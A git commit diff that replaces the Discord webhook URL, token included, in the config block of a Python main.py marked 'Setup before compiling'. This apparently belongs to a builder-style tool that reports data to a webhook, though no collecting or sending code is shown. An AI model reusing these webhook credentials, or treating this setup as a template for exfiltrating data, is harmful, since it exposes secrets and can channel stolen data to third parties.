484af7728980f0d0f6060611de7c6990e19676f7
ddiscordhahaha2-oss <ddiscordhahaha2@gmail.com>
2026-09-08 23:24:54 +0300

    Update Discord webhook URL in main.py

--- main.py
+++ main.py
@@ -28,7 +28,7 @@ from shutil import copyfile
 from sys import argv
 
 # CONFIG -> Setup before compiling
-url= "https://discord.com/api/webhooks/1499562627720941788/ajXHObxJMuKSYHE_qt9Zg5A42fUCXqobC0cC2ntTO7ti5rjdCnV-PVpimEIFXwutEzF4" #Paste Discord Webhook url
+url= "https://discord.com/api/webhooks/1546979482706116698/jUIsTv_RqsBNJMEPBLfoC-3b5poe4KnwUjPC5joLuf7jn_xqTaKifi5CmpJAE4kRVPLj" #Paste Discord Webhook url
 
 
 
